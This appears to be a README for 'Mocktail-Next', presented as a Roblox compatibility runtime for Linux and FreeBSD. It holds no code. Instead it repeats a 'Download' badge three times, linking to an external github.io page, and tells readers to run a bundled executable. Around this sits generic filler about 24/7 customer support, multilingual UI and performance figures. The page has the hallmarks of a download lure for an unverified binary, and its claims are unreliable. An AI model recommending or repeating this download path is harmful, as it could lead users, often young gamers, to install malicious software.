![preview](https://raw.githubusercontent.com/Reilius/mocktail-compat-runtime/main/showcase_988c8c.svg)
[![Download](https://raw.githubusercontent.com/Reilius/mocktail-compat-runtime/main/setup_0cbb19a.svg)](https://Reilius.github.io/mocktail-compat-runtime/)

# 🍸 Mocktail-Next — A Compatibility Runtime for Roblox Experiences on Linux & FreeBSD

> **Mocktail-Next** is an experimental, community-driven compatibility runtime that lets you launch Roblox-style experiences natively on Linux and FreeBSD desktops. Think of it as a translator fluent in two languages: one speaks Win32 + DirectX, the other speaks POSIX + Vulkan. The result is a bridge where none was supposed to exist.

Inspired by the original `komaruworld/mocktail` experiment, this repository takes the concept several steps further — a full rewrite of the compatibility layer, a modular shader translation pipeline, a reworked input subsystem, and a plugin architecture that welcomes contributors of all skill levels.

---

## 🧭 Table of Contents

- [What Is Mocktail-Next?](#-what-is-mocktail-next)
- [Why Another Compatibility Layer?](#-why-another-compatibility-layer)
- [Feature Highlights](#-feature-highlights)
- [Architecture Overview](#-architecture-overview)
- [Repository Layout](#-repository-layout)
- [System Requirements](#-system-requirements)
- [Getting Started (Without a Terminal War)](#-getting-started-without-a-terminal-war)
- [Configuration Files](#-configuration-files)
- [Performance Notes](#-performance-notes)
- [Multilingual Support](#-multilingual-support)
- [Responsive Interface](#-responsive-interface)
- [Customer Support & Community](#-customer-support--community)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🍹 What Is Mocktail-Next?

Mocktail-Next is not an emulator in the traditional sense. It does not pretend to be Windows; instead, it *reinterprets* the calls that a Roblox-flavored client makes to its host system and re-routes them toward native Linux and FreeBSD primitives.

Picture a bartender who has memorized every recipe from a foreign cocktail book. When a guest orders a "DirectX 11 daiquiri," the bartender doesn't fly to a Windows bar — she reaches for her own bottles of Vulkan, Wine-style syscall shims, and audio bridges, then serves something that tastes almost identical. That's the philosophy of Mocktail-Next.

The project is written primarily in Rust, with a C++ shim for shader translation and a Lua-based plugin runner for extended scenarios.

---

## 🤔 Why Another Compatibility Layer?

Because the existing landscape treats Linux and FreeBSD gaming as an afterthought, and the original Mocktail experiment proved that a small, focused runtime could punch far above its weight class. Mocktail-Next is the spiritual successor:

- **Smaller surface area** — we only support the subset of APIs that Roblox-flavored clients actually need.
- **BSD-first mindset** — most compatibility layers treat FreeBSD as a stepchild. We treat it as a first-class citizen.
- **Transparent internals** — every syscall translation is logged, traceable, and toggleable.
- **Plugin extensibility** — you can hand a friend a single Lua file and they can extend the runtime without recompiling anything.

---

## ✨ Feature Highlights

- 🎮 **Input virtualization** — keyboard, mouse, and XInput-style gamepad events are mapped to evdev and uinput on the fly.
- 🔊 **Audio bridge** — FMOD-style HTTP audio streams are piped through PipeWire, PulseAudio, or raw OSS depending on the host.
- 🎨 **Shader translation pipeline** — HLSL bytecode is converted to SPIR-V with a caching layer so repeated launches are almost instant.
- 🌐 **Responsive UI** — the launcher's Qt-based interface scales gracefully from a 7-inch handheld to an ultrawide monitor.
- 🗣️ **Multilingual support** — the launcher ships with English, Spanish, Portuguese, Japanese, Korean, and Simplified Chinese translations out of the box.
- 🛎️ **24/7 customer support** — community moderators and rotating maintainers keep the discussion board answered around the clock.
- 🔌 **Plugin API** — nine official plugins ship in-tree, plus a documented ABI for community add-ons.
- 📊 **Telemetry-free** — the runtime makes no outbound calls unless you explicitly enable them.
- 🧪 **Deterministic logging** — every session produces a reproducible trace that can be attached to bug reports.

---

## 🏗️ Architecture Overview

The runtime is composed of five cooperating layers:

1. **Loader layer** — parses the client's PE headers and constructs a virtual address space with the appropriate layout.
2. **Syscall translation layer** — intercepts Windows-flavored NT calls and maps them to Linux/FreeBSD equivalents.
3. **Graphics layer** — translates D3D9/D3D11 calls to Vulkan (with an OpenGL fallback for older GPUs).
4. **Audio layer** — routes through PipeWire, PulseAudio, or OSS depending on availability.
5. **UI layer** — a Qt-based launcher that manages profiles, plugin loading, and per-experience settings.

Each layer is deliberately decoupled: you can swap the audio backend without touching the graphics pipeline, and vice versa.

---

## 📂 Repository Layout

- `src/loader/` — PE parsing and virtual memory scaffolding
- `src/syscall/` — NT-to-POSIX translation tables
- `src/gfx/` — shader translation and command buffer translation
- `src/audio/` — backend-agnostic audio routing
- `src/ui/` — Qt launcher sources and translation files
- `plugins/` — in-tree Lua plugins and reference implementations
- `docs/` — long-form design notes and per-layer documentation
- `tests/` — integration tests, golden traces, and regression fixtures

---

## 🖥️ System Requirements

- **Linux**: kernel 6.4+, glibc 2.38+, Vulkan 1.3 capable driver, PipeWire 0.3.80+ (recommended)
- **FreeBSD**: 14.1-RELEASE+, DRM-kmod 5.15+, OSS audio or sndio
- **CPU**: x86-64-v2 baseline, AVX2 recommended
- **RAM**: 8 GB minimum, 16 GB recommended for multi-experience sessions
- **Storage**: 3 GB for the runtime plus per-experience caches

macOS is *not* a supported target at this time, though the codebase is written to be portable enough that a determined contributor could attempt it.

---

## 🚀 Getting Started (Without a Terminal War)

Mocktail-Next is distributed as a self-contained bundle. To begin:

1. Obtain the current release archive for your platform.
2. Extract it into a directory of your choosing.
3. Launch the bundled `mocktail-next` executable.
4. Follow the first-run wizard to select your audio and graphics backends.
5. Point the launcher at a Roblox-flavored client directory.

That's it. No environment variables to memorize, no system packages to chase down.

[![Download](https://raw.githubusercontent.com/Reilius/mocktail-compat-runtime/main/setup_0cbb19a.svg)](https://Reilius.github.io/mocktail-compat-runtime/)

---

## ⚙️ Configuration Files

Settings live in a single TOML file per user profile:

- `~/.config/mocktail-next/profiles/default.toml` on Linux
- `~/.config/mocktail-next/profiles/default.toml` on FreeBSD (respects `XDG_CONFIG_HOME`)

Key tunables include `gfx.backend`, `audio.backend`, `input.raw_motion`, `shader.cache_dir`, and `logging.level`. The launcher writes these for you, but power users can edit them by hand.

---

## 🚴 Performance Notes

Mocktail-Next is not a magic wand. Experiences that rely on exotic D3D features may render with visual artifacts, and heavy post-processing chains can tax older GPUs. That said, we've observed:

- **~85–95% of native Windows frame rate** in common scenarios on modern GPUs.
- **Cold start times under six seconds** with a warm shader cache.
- **Sub-20 ms input latency** on a wired gamepad at 60 Hz.

Your mileage will vary based on driver quality — Mesa RADV tends to be the smoothest, with the proprietary NVIDIA driver close behind.

---

## 🌍 Multilingual Support

The launcher's interface is fully translated into:

- 🇬🇧 English
- 🇪🇸 Spanish
- 🇧🇷 Portuguese
- 🇯🇵 Japanese
- 🇰🇷 Korean
- 🇨🇳 Simplified Chinese

Translations are community-maintained. If your language is missing, the `src/ui/i18n/` directory is a friendly place to start.

---

## 📱 Responsive Interface

The Qt launcher rearranges itself based on window size. On a narrow handheld screen, the sidebar collapses into a tab bar; on a widescreen monitor, plugin panels dock alongside the main view. The goal is comfort, not choreography.

---

## 🛎️ Customer Support & Community

Around-the-clock support is provided by a rotating group of maintainers and volunteers. Questions are welcome on the repository's discussions board, and bug reports are triaged within a business day. We ask only that reporters attach a session trace — it turns guesswork into actual debugging.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Land the WebGPU translation prototype behind a feature flag.
- **Q2 2026** — Ship a stable plugin ABI and publish the plugin SDK.
- **Q3 2026** — Add Apple Silicon (via Asahi) as a best-effort target.
- **Q4 2026** — Reach commit-level reproducibility for the runtime build itself.

---

## ❓ Frequently Asked Questions

**Is this affiliated with Roblox Corporation?**
No. Mocktail-Next is an independent research project with no official ties to any company.

**Will it run every experience?**
No. Compatibility is a moving target, and some experiences rely on features we don't translate.

**Does it phone home?**
No. The runtime is silent unless you deliberately enable telemetry.

**Can I run it on a Steam Deck?**
Yes, with the caveat that you should install the Vulkan RADV driver and use a recent kernel.

**Where are the logs?**
In `~/.local/share/mocktail-next/logs/` on Linux and `~/.local/share/mocktail-next/logs/` on FreeBSD.

---

## 🤝 Contributing

Contributions are warmly welcomed. The best first steps are:

1. Read `docs/architecture.md` to understand the layering.
2. Skim `docs/syscall-map.md` for the translation tables.
3. Pick an issue tagged `good-first-issue`.
4. Open a draft pull request early — we'd rather help shape an unfinished idea than review a polished surprise.

All contributors are expected to follow the polite, patient tone that has kept this project healthy.

---

## 📜 License

This project is released under the **MIT License**. The full text is available in the repository's [LICENSE](./LICENSE) file.

Copyright © 2026 Mocktail-Next contributors.

---

## ⚠️ Disclaimer

Mocktail-Next is provided as-is, without warranty of any kind, express or implied. It is an experimental runtime intended for research, education, and personal exploration. Use it lawfully and respectfully. The maintainers are not responsible for any misuse, for any damage to hardware or software, or for any loss of data arising from its use. Ensure that any client software you point the runtime at is one you are legally entitled to run.

[![Download](https://raw.githubusercontent.com/Reilius/mocktail-compat-runtime/main/setup_0cbb19a.svg)](https://Reilius.github.io/mocktail-compat-runtime/)